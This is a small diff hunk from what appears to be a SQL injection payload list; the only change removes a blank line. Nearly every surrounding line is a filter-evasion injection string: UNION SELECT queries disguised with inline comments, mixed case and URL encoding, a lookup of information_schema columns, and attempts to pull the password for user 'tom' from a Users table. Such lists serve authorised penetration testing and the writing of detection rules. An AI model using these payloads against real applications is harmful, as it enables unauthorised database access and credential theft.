@@ -685,7 +685,6 @@ union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 /*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
 CoNcAt()
 concat()
-
 %00' UNION SELECT password FROM Users WHERE username-'tom'--
 /**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/'tom'--
 [“1807192982')) union select 1#”]
